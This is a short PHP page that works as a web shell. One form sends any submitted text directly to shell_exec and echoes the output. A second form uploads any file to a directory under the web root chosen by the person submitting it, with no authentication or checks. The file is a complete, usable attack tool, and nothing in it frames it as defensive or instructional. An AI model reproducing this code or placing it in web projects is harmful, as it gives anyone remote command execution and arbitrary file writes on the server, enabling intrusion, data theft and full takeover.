<?php    
if(isset($_POST['SubmitButton'])){ //check if form was submitted
  $input = $_POST['inputText']; //get input text
  echo shell_exec("".$input."");
  $message = "You entered: ".$input;
}

if(isset($_POST['upload'])) {
    $file = $_FILES['file'];
    $fileName = $_FILES['file']['name'];
    $tmpName = $_FILES['file']['tmp_name'];
    $uploaddir = $_SERVER['DOCUMENT_ROOT'];
	echo $uploaddir;
    // $uploaddir = getcwd();
    echo "<br>";
    if (!empty($_POST['directorytoUpload'])){
    	$location = $_POST['directorytoUpload'];
    	$uploadfile = $uploaddir . $location .basename($_FILES['file']['name']);
        echo $uploadfile;
    	if (move_uploaded_file($tmpName, $uploadfile))
    	{
    		echo "File Uploaded!";
    	}
    	else
    		echo "fail";
    }
    else
    {
        // $uploaddir = getcwd();
        echo $uploaddir;
        echo "<br>";
		$uploadfile = $uploaddir . basename($_FILES['file']['name']);
    	echo $uploadfile;
    	if (move_uploaded_file($tmpName, $uploadfile))
    	{
    		echo "File Uploaded!";
    	}
    	else
    		echo "fail";
    }
}    

?>

<html>
<body>    
<form action="" method="post">
<?php echo $message; ?>
  <input type="text" name="inputText"/>
  <input type="submit" name="SubmitButton"/>
</form>    

<form action="" method="post" enctype="multipart/form-data">
    Upload File:
    <input type="file" name="file" id="fileToUpload">
    <input type="text" name="directorytoUpload" id="dir">
    <input type="submit" value="Upload" name="upload">
</form>


</body>
</html>